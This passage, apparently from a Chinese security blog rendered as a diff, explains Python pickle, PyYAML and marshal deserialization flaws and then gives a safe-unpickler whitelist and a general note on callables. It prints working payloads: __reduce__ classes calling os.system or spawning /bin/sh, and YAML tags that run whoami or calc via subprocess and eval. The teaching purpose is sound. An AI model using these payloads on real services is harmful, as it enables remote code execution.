+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">import pickle
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">class User:
+</span></span><span class="line"><span class="cl">    def __init__(self, name):
+</span></span><span class="line"><span class="cl">        self.name = name
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"># 序列化对象
+</span></span><span class="line"><span class="cl">user = User(&#34;Alice&#34;)
+</span></span><span class="line"><span class="cl">serialized = pickle.dumps(user)  
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>2.基础反序列化:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="c1"># 反序列化</span>
+</span></span><span class="line"><span class="cl"><span class="n">loaded_user</span> <span class="o">=</span> <span class="n">pickle</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">serialized</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">loaded_user</span><span class="o">.</span><span class="n">name</span><span class="p">)</span>  <span class="c1"># 输出 Alice  </span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>3.恶意反序列化示例:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">import</span> <span class="n">pickle</span>
+</span></span><span class="line"><span class="cl"><span class="n">import</span> <span class="n">os</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="n">Malicious</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">__reduce__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="c1"># 反序列化时执行系统命令</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">,</span> <span class="p">(</span><span class="s2">&#34;echo &#39;Hacked!&#39;&#34;</span><span class="p">,))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 生成恶意 payload</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">pickle</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">Malicious</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 反序列化触发攻击</span>
+</span></span><span class="line"><span class="cl"><span class="n">pickle</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>  <span class="c1"># 输出 Hacked!  </span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>安全风险根源:</p>
+<p>  <code>__reduce__</code>方法：在反序列化时自动调用，返回一个元组（函数、参数），执行函数。</p>
+<p>  任意代码执行：攻击者可构造恶意<code>__reduce__</code>方法，执行危险操作（如删除文件、反弹Shell）。</p>
+<p>防御方法</p>
+<p>  避免反序列化不可信数据：永远不要对来源未知的数据使用 <code>pickle.load()</code>。</p>
+<p>  限制允许的类（白名单）：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">import</span> <span class="n">pickle</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="n">SafeUnpickler</span><span class="p">(</span><span class="n">pickle</span><span class="o">.</span><span class="n">Unpickler</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">allowed_classes</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&#34;__main__.User&#34;</span><span class="p">}</span>  <span class="c1"># 仅允许User类</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">find_class</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">module</span><span class="p">,</span> <span class="n">name</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="n">full_name</span> <span class="o">=</span> <span class="n">f</span><span class="s2">&#34;{module}.{name}&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">full_name</span> <span class="ow">not</span> <span class="ow">in</span> <span class="bp">self</span><span class="o">.</span><span class="n">allowed_classes</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">raise</span> <span class="n">pickle</span><span class="o">.</span><span class="n">UnpicklingError</span><span class="p">(</span><span class="n">f</span><span class="s2">&#34;禁止的类: {full_name}&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">super</span><span class="p">()</span><span class="o">.</span><span class="n">find_class</span><span class="p">(</span><span class="n">module</span><span class="p">,</span> <span class="n">name</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 安全反序列化</span>
+</span></span><span class="line"><span class="cl"><span class="n">safe_data</span> <span class="o">=</span> <span class="n">SafeUnpickler</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">BytesIO</span><span class="p">(</span><span class="n">serialized</span><span class="p">))</span><span class="o">.</span><span class="n">load</span><span class="p">()</span>  
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="反序列化漏洞的成因">反序列化漏洞的成因
+</h4><p>我们上面提到了YAML和pickle的反序列化过程以及他们的风险漏洞，这里来总结一下。</p>
+<h5 id="yaml的反序列化漏洞">YAML的反序列化漏洞
+</h5><p>造成YAML反序列化漏洞的原因是由于过于相信YAML数据来源，在反序列化的过程中使用了一些危险标签，使得攻击者利用这些标签使用 <code>yaml.load()</code> 方法来动态构造Python对象，导致程序错误地调用了 <code>os.system()</code> 进行命令执行</p>
+<h5 id="pickle-的反序列化漏洞">Pickle 的反序列化漏洞
+</h5><p>造成pickle反序列化漏洞的原因是在反序列化过程中，存在调用<code>__reduce__</code>方法的可能，这一方法使得攻击者可以通过构造恶意类，在<code>__reduce__</code>中返回一个危险的可调用对象（如 os.system），从而在反序列化时触发任意代码执行。</p>
+<h6 id="为什么__reduce__危险">为什么<code>__reduce__</code>危险？
+</h6><ul>
+<li>完全控制反序列化逻辑：</li>
+</ul>
+<p><code>__reduce__</code>允许攻击者指定任意函数和参数，且反序列化时自动执行。</p>
+<ul>
+<li>绕过对象状态限制：</li>
+</ul>
+<p>即使目标代码中没有恶意类，攻击者也可以构造包含危险函数的<code>__reduce__</code>。</p>
+<h3 id="python反序列化漏洞的利用">Python反序列化漏洞的利用
+</h3><p>我们已经讨论过Python中的反序列化漏洞是由于错误使用<code>yaml.load()</code>、危险标签和<code>__reduce__</code>，导致的命令执行漏洞，因此，我们的利用点也着眼于此。</p>
+<h4 id="yaml漏洞的利用">yaml漏洞的利用
+</h4><p>对于PyYaml&lt;5.1版本下的漏洞，其主要原因主要出现在下面五个python标签：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">python/name
+</span></span><span class="line"><span class="cl">python/module
+</span></span><span class="line"><span class="cl">python/object
+</span></span><span class="line"><span class="cl">python/object/new
+</span></span><span class="line"><span class="cl">python/object/apply
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>漏洞成因：</p>
+<p> 由于上面提到的五个标签，在constructor.py文件被加载器解析导致，攻击者利用这类标签可以达到任意命令执行，以及验证绕过等漏洞的利用。</p>
+<p>payload：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">!!python/object/apply:os.system [&#34;calc.exe&#34;]
+</span></span><span class="line"><span class="cl">!!python/object/new:os.system [&#34;calc.exe&#34;]    
+</span></span><span class="line"><span class="cl">!!python/object/new:subprocess.check_output [[&#34;calc.exe&#34;]]
+</span></span><span class="line"><span class="cl">!!python/object/apply:subprocess.check_output [[&#34;calc.exe&#34;]]  
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>在5.1之后的yaml中load函数被限制使用了，会被警告提醒加上一个参数 Loader</p>
+<p>针对不同的需要，选择不同的加载器，有以下几种加载器</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">BaseConstructor</span><span class="err">：仅加载最基本的</span><span class="n">YAML</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">SafeConstructor</span><span class="err">：安全加载</span><span class="n">Yaml语言的子集</span><span class="err">，建议用于加载不受信任的输入（</span><span class="n">safe_load</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">FullConstructor</span><span class="err">：加载的模块必须位于</span> <span class="n">sys</span><span class="o">.</span><span class="n">modules</span> <span class="err">中（说明程序已经</span> <span class="n">import</span> <span class="err">过了才让加载）。这个是默认的加载器。</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">UnsafeConstructor</span><span class="err">（也称为</span><span class="n">Loader向后兼容性</span><span class="err">）：原始的</span><span class="n">Loader代码</span><span class="err">，可以通过不受信任的数据输入轻松利用（</span><span class="n">unsafe_load</span><span class="err">）</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">Constructor</span><span class="err">：等同于</span><span class="n">UnsafeConstructor</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>如果说指定的加载器是UnsafeConstructor 或者Constructor，那么利用方式就照旧</p>
+<p>payload</p>
+<p>我们可以用python的内置函数eval（或者exec）来执行代码，用map来触发函数执行，用tuple将map对象转化为元组输出来（当然用list、frozenset、bytes都可以），用python写出来如下</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">tuple(map(eval, [&#34;__import__(&#39;os&#39;).system(&#39;whoami&#39;)&#34;]))
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>变为yaml</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">yaml</span><span class="o">.</span><span class="n">load</span><span class="p">(</span><span class="s2">&#34;&#34;&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s2">!!python/object/new:tuple
+</span></span></span><span class="line"><span class="cl"><span class="s2">- !!python/object/new:map
+</span></span></span><span class="line"><span class="cl"><span class="s2">- !!python/name:eval
+</span></span></span><span class="line"><span class="cl"><span class="s2">- [&#34;__import__(&#39;os&#39;).system(&#39;whoami&#39;)&#34;]
+</span></span></span><span class="line"><span class="cl"><span class="s2">&#34;&#34;&#34;</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>除此之外网上还有很多大佬有其他的payload</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">#创建了一个类型为z的新对象,而对象中extend属性在创建时会被调用,参数为listitems内的参数
+</span></span><span class="line"><span class="cl">!!python/object/new:type
+</span></span><span class="line"><span class="cl">args: [&#34;z&#34;, !!python/tuple [], {&#34;extend&#34;: !!python/name:exec }]
+</span></span><span class="line"><span class="cl">listitems: &#34;__import__(&#39;os&#39;).system(&#39;whoami&#39;)&#34;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">#报错但是执行了
+</span></span><span class="line"><span class="cl">  - !!python/object/new:str
+</span></span><span class="line"><span class="cl">    args: []
+</span></span><span class="line"><span class="cl">    state: !!python/tuple
+</span></span><span class="line"><span class="cl">    - &#34;__import__(&#39;os&#39;).system(&#39;whoami&#39;)&#34;
+</span></span><span class="line"><span class="cl">    - !!python/object/new:staticmethod
+</span></span><span class="line"><span class="cl">    args: [0]
+</span></span><span class="line"><span class="cl">    state:
+</span></span><span class="line"><span class="cl">        update: !!python/name:exec
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="o">-</span> <span class="o">!!</span><span class="n">python</span><span class="o">/</span><span class="n">object</span><span class="o">/</span><span class="n">new</span><span class="p">:</span><span class="n">yaml</span><span class="o">.</span><span class="n">MappingNode</span>
+</span></span><span class="line"><span class="cl"><span class="n">listitems</span><span class="p">:</span> <span class="o">!!</span><span class="nb">str</span> <span class="s1">&#39;!!python/object/apply:subprocess.Popen [whoami]&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">state</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">tag</span><span class="p">:</span> <span class="o">!!</span><span class="nb">str</span> <span class="n">dummy</span>
+</span></span><span class="line"><span class="cl">    <span class="n">value</span><span class="p">:</span> <span class="o">!!</span><span class="nb">str</span> <span class="n">dummy</span>
+</span></span><span class="line"><span class="cl">    <span class="n">extend</span><span class="p">:</span> <span class="o">!!</span><span class="n">python</span><span class="o">/</span><span class="n">name</span><span class="p">:</span><span class="n">yaml</span><span class="o">.</span><span class="n">unsafe_load</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>参考：</p>
+<blockquote>
+<p><a class="link" href="https://forum.butian.net/share/2288"  target="_blank" rel="noopener"
+    >PyYaml反序列化漏洞</a></p></blockquote>
+<blockquote>
+<p><a class="link" href="https://www.cnblogs.com/damoxilai/p/16707055.html"  target="_blank" rel="noopener"
+    >PyYAML反序列化漏洞</a></p></blockquote>
+<h4 id="pickle-漏洞利用">Pickle 漏洞利用
+</h4><p>漏洞常见出现地方</p>
+<ol>
+<li>通常在解析认证<code>token</code>, <code>session</code>的时候. 现在很多 Web 服务都使用<code>redis</code>、<code>mongodb</code>、<code>memcached</code>等来存储<code>session</code>等状态信息.</li>
+<li>可能将对象 Pickle 后存储成磁盘文件.</li>
+<li>可能将对象 Pickle 后在网络中传输.</li>
+</ol>
+<p>基本 Payload</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">import</span> <span class="n">os</span>
+</span></span><span class="line"><span class="cl"><span class="n">import</span> <span class="n">pickle</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="n">Demo</span><span class="p">(</span><span class="n">object</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">__reduce__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="n">shell</span> <span class="o">=</span> <span class="s1">&#39;/bin/sh&#39;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">,(</span><span class="n">shell</span><span class="p">,))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">demo</span> <span class="o">=</span> <span class="n">Demo</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">pickle</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">pickle</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">demo</span><span class="p">))</span>  
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h5 id="marshal-反序列化">Marshal 反序列化
+</h5><p>由于pickle无法序列化code对象, 因此在python2.6后增加了一个marshal模块来处理code对象的序列化问题.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">import base64
+</span></span><span class="line"><span class="cl">import marshal
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">def demo():
+</span></span><span class="line"><span class="cl">    import os
+</span></span><span class="line"><span class="cl">    os.system(&#39;/bin/sh&#39;)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">code_serialized = base64.b64encode(marshal.dumps(demo()))
+</span></span><span class="line"><span class="cl">print(code_serialized)  
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>但是marshal不能直接使用<code>__reduce__</code>, 因为<code>reduce</code>是利用调用某个<code>callable</code>并传递参数来执行的, 而<code>marshal</code>函数本身就是一个<code>callable</code>, 需要执行它, 而不是将他作为某个函数的参数.</p>
+<p>Pyload(PyYaml &gt;= 5.1)</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">from</span> <span class="n">yaml</span> <span class="n">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="n">data</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;&#34;&#34;!!python/object/apply:subprocess.Popen
+</span></span></span><span class="line"><span class="cl"><span class="s2">- calc&#34;&#34;&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">deserialized_data</span> <span class="o">=</span> <span class="nb">load</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">Loader</span><span class="o">=</span><span class="n">Loader</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">deserialized_data</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">from</span> <span class="n">yaml</span> <span class="n">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="n">data</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;&#34;&#34;!!python/object/apply:subprocess.Popen
+</span></span></span><span class="line"><span class="cl"><span class="s2">- calc&#34;&#34;&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">deserialized_data</span> <span class="o">=</span> <span class="n">unsafe_load</span><span class="p">(</span><span class="n">data</span><span class="p">)</span> 
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">deserialized_data</span><span class="p">)</span>  
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>参考：</p>
+<blockquote>
+<p><a class="link" href="https://ucasers.cn/python%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%bc%8f%e6%b4%9e%e4%b8%8e%e6%b2%99%e7%ae%b1%e9%80%83%e9%80%b8/#"  target="_blank" rel="noopener"
+    >Python反序列化漏洞与沙箱逃逸</a></p></blockquote>
+<blockquote>
+<p><a class="link" href="https://goodapple.top/archives/1069"  target="_blank" rel="noopener"
+    >Pickle反序列化</a></p></blockquote>
+<blockquote>
+<p><a class="link" href="https://github.com/H3rmesk1t/Security-Learning/blob/main/PythonSec/Python%e5%ae%89%e5%85%a8%e5%ad%a6%e4%b9%a0%e2%80%94Python%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%bc%8f%e6%b4%9e/Python%e5%ae%89%e5%85%a8%e5%ad%a6%e4%b9%a0%e2%80%94Python%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%bc%8f%e6%b4%9e.md"  target="_blank" rel="noopener"
+    >Python安全学习—Python反序列化漏洞</a></p></blockquote>
+<blockquote>
+<p><a class="link" href="https://tttang.com/archive/1885/"  target="_blank" rel="noopener"
+    >python反序列化详解</a></p></blockquote>
+<hr>
+<p>其他：</p>
+<p>关于callable：
+在 Python 中，<strong>“callable”（可调用对象）</strong> 是指任何可以通过 <code>()</code> 运算符调用的对象。简单来说，如果一个对象可以像函数一样被调用（例如 <code>obj()</code>），它就是可调用的。以下是关于 callable 的详细解释：</p>
+<h3 id="1-常见的可调用对象类型"><strong>1. 常见的可调用对象类型</strong>
+</h3><h4 id="1-函数function"><strong>(1) 函数（Function）</strong>
+</h4><ul>
+<li>
+<p>包括内置函数、自定义函数、Lambda 函数。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">python
+</span></span><span class="line"><span class="cl">def greet(name):
+</span></span><span class="line"><span class="cl">    print(f&#34;Hello, {name}!&#34;)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"># 调用函数
+</span></span><span class="line"><span class="cl">greet(&#34;Alice&#34;)  # 输出 Hello, Alice!
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"># Lambda 也是可调用的
+</span></span><span class="line"><span class="cl">add = lambda a, b: a + b
+</span></span><span class="line"><span class="cl">print(add(3, 5))  # 输出 8
+</span></span></code></pre></td></tr></table>
+</div>
+</div></li>
+</ul>
+<h4 id="2-类class"><strong>(2) 类（Class）</strong>
+</h4><ul>
+<li>
+<p>类本身是可调用的</p>
+<p>，调用类会创建它的实例。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">python
+</span></span><span class="line"><span class="cl">class Dog:
+</span></span><span class="line"><span class="cl">    def __init__(self, name):
+</span></span><span class="line"><span class="cl">        self.name = name
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"># 调用类创建实例
+</span></span><span class="line"><span class="cl">my_dog = Dog(&#34;Buddy&#34;)  # Dog 类是可调用的
+</span></span></code></pre></td></tr></table>
+</div>
+</div></li>
+</ul>
+<h4 id="3-方法method"><strong>(3) 方法（Method）</strong>
+</h4><ul>
+<li>
+<p>类中定义的方法（实例方法、类方法、静态方法）。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">python
+</span></span><span class="line"><span class="cl">class Calculator:
+</span></span><span class="line"><span class="cl">    def add(self, a, b):  # 实例方法
+</span></span><span class="line"><span class="cl">        return a + b
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    @classmethod
+</span></span><span class="line"><span class="cl">    def multiply(cls, a, b):  # 类方法
+</span></span><span class="line"><span class="cl">        return a * b
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    @staticmethod
+</span></span><span class="line"><span class="cl">    def subtract(a, b):  # 静态方法
+</span></span><span class="line"><span class="cl">        return a - b
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">calc = Calculator()
+</span></span><span class="line"><span class="cl">calc.add(2, 3)           # 实例方法调用
+</span></span><span class="line"><span class="cl">Calculator.multiply(2, 3)  # 类方法调用
+</span></span><span class="line"><span class="cl">Calculator.subtract(5, 2)  # 静态方法调用
+</span></span></code></pre></td></tr></table>
+</div>
+</div></li>
+</ul>
+<h4 id="4-实现了"><strong>(4) 实现了 <code>__call__</code> 方法的对象</strong>
+</h4><ul>
+<li>
+<p>如果一个类定义了</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">__call__
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>方法，它的实例会成为可调用对象。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
